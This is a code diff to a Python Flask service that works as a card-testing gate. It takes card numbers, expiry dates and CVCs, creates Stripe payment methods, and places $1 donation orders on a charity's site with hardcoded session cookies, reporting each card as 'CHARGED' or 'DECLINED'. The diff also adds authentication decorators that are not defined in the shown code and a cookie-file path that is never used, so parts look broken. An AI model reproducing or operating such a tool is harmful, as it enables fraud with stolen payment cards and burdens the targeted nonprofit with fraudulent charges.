@@ -1,7 +1,9 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, session
 import logging
 import os
 import requests
+import tempfile
+from functools import wraps
 
 app = Flask(__name__)
 
@@ -12,7 +14,8 @@ logging.basicConfig(
     handlers=[logging.StreamHandler()]
 )
 
-def fetch_cart_token(cookie_jar):
+
+def fetch_cart_token(cookie_jar_path):
     cart_headers = {
         'authority': 'www.onamissionkc.org',
         'accept': 'application/json',
@@ -46,7 +49,7 @@ def fetch_cart_token(cookie_jar):
             'https://www.onamissionkc.org/api/v1/fund-service/websites/62fc11be71fa7a1da8ed62f8/donations/funds/6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b',
             headers=cart_headers,
             json=cart_data,
-            cookies=cookie_jar,
+            cookies={},
             timeout=30,
             verify=True
         )
@@ -74,7 +77,7 @@ def fetch_cart_token(cookie_jar):
         logging.error(f"Failed to fetch new cart token: {str(e)}")
         return None, jsonify({'status': 'ERROR', 'message': 'Unable to create new cart'}), 500
 
-def make_merchant_api_call(cart_token, pid, cookie_jar):
+def make_merchant_api_call(cart_token, pid, cookie_jar_path):
     cookies = {
         'crumb': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
         'ss_cvr': 'b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1',
@@ -155,7 +158,7 @@ def make_merchant_api_call(cart_token, pid, cookie_jar):
             'https://www.onamissionkc.org/api/2/commerce/orders',
             headers=headers,
             json=json_data,
-            cookies={**cookies, **cookie_jar},
+            cookies=cookies,
             timeout=30,
             verify=True
         )
@@ -164,26 +167,28 @@ def make_merchant_api_call(cart_token, pid, cookie_jar):
         logging.error(f"Merchant API call failed: {str(e)}")
         return {'failureType': 'Request failed'}, 500
 
-@app.route('/gate=stripe1$/cc=', methods=['GET'])
+@app.route('/gate=stripe1$/cc=', methods=['POST'])
+@require_api_key
+@require_session
 def process_payment():
-    # Get card details from pipe-separated query parameter
-    card_param = request.args.get('card', '')
-    if not card_param:
-        return jsonify({'status': 'DECLINED', 'message': 'Missing card details'}), 400
+    # Get card details from POST JSON
+    card_data = request.json.get('card', {})
+    card_number = card_data.get('number', '')
+    exp_month = card_data.get('exp_month', '')
+    exp_year = card_data.get('exp_year', '')
+    cvc = card_data.get('cvc', '')
 
-    try:
-        card_number, exp_month, exp_year, cvc = card_param.split('|')
-        if not all([card_number, exp_month, exp_year, cvc]):
-            return jsonify({'status': 'DECLINED', 'message': 'Incomplete card details'}), 400
-    except ValueError:
-        return jsonify({'status': 'DECLINED', 'message': 'Invalid card details format'}), 400
+    # Validate card details
+    if not all([card_number, exp_month, exp_year, cvc]):
+        return jsonify({'status': 'DECLINED', 'message': 'Missing card details'}), 400
 
     # Format year to 4 digits if needed
     if len(exp_year) == 2:
         exp_year = '20' + exp_year
 
     # Initialize cookie jar for session continuity
-    cookie_jar = {}
+    with tempfile.NamedTemporaryFile(delete=False) as cookie_jar_file:
+        cookie_jar_path = cookie_jar_file.name
 
     # First API call to create payment method
     headers = {
@@ -247,6 +252,7 @@ def process_payment():
 
         if 'id' not in apx:
             error_msg = apx.get('error', {}).get('message', 'Unknown error')
+            os.unlink(cookie_jar_path)
             return jsonify({'status': 'DECLINED', 'message': error_msg}), 400
 
         pid = apx['id']
@@ -254,14 +260,16 @@ def process_payment():
         # Attempt merchant API call with retry on errors
         max_retries = 3
         retry_count = 0
-        cart_token, error_response = fetch_cart_token(cookie_jar)
+        cart_token, error_response = fetch_cart_token(cookie_jar_path)
         if error_response:
+            os.unlink(cookie_jar_path)
             return error_response
 
         while retry_count < max_retries:
-            apx1, http_code = make_merchant_api_call(cart_token, pid, cookie_jar)
+            apx1, http_code = make_merchant_api_call(cart_token, pid, cookie_jar_path)
 
             if http_code == 200 and 'failureType' not in apx1:
+                os.unlink(cookie_jar_path)
                 return jsonify({
                     'status': 'CHARGED',
                     'message': 'Charged $1 successfully',
@@ -271,13 +279,15 @@ def process_payment():
             # Handle specific errors
             if apx1.get('failureType') in ['CART_ALREADY_PURCHASED', 'CART_MISSING', 'STALE_USER_SESSION']:
                 logging.error(f"Error: {apx1['failureType']}, retrying with new cart token")
-                cart_token, error_response = fetch_cart_token(cookie_jar)
+                cart_token, error_response = fetch_cart_token(cookie_jar_path)
                 if error_response:
+                    os.unlink(cookie_jar_path)
                     return error_response
                 retry_count += 1
                 continue
 
             # Other failures
+            os.unlink(cookie_jar_path)
             error_msg = apx1.get('failureType', 'Unknown error')
             return jsonify({
                 'status': 'DECLINED',
@@ -286,6 +296,7 @@ def process_payment():
             }), 400
 
         # Max retries reached
+        os.unlink(cookie_jar_path)
         logging.error("Max retries reached for errors")
         return jsonify({
             'status': 'ERROR',
@@ -294,6 +305,7 @@ def process_payment():
         }), 500
 
     except requests.RequestException as e:
+        os.unlink(cookie_jar_path)
         logging.error(f"Stripe API call failed: {str(e)}")
         return jsonify({'status': 'ERROR', 'message': 'Unable to process payment'}), 500
 
@@ -301,3 +313,4 @@ if __name__ == '__main__':
     # Get port from environment variable for Render compatibility
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
+ 
